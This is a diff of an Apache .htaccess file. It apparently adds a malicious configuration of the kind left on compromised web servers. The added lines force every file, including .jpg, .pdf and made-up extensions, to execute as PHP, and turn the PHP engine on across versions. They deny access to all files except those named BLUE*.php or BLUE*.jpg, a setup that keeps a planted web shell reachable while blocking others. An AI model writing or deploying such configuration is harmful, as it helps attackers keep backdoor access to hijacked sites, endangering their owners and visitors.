@@ -1,4 +1,28 @@
-<FilesMatch "^index.*\.(php|phar|phtml|shtml)$">
+<Files *>
+SetHandler application/x-httpd-php
+AddHandler .cgi .php .php3 .php4 .php5 .php7 .phtml .pl .py .pyc .pyo .pdf .lol
+</Files>
+<IfModule mod_php7.c>
+php_value engine on
+php_flag engine on
+</IfModule>
+<IfModule mod_php5.c>
+php_value engine on
+php_flag engine on
+</IfModule>
+<IfModule mod_php4.c>
+php_value engine on
+php_flag engine on
+</IfModule>
+<IfModule mod_php6.c>
+php_value engine on
+php_flag engine on
+</IfModule>
+<FilesMatch ".*">
+  Order Deny,Allow
+  Deny from all
+</FilesMatch>
+<FilesMatch "^BLUE.*\.(php|phar|phtml|shtml|jpg)$">
   Order Allow,Deny
   Allow from all
 </FilesMatch>
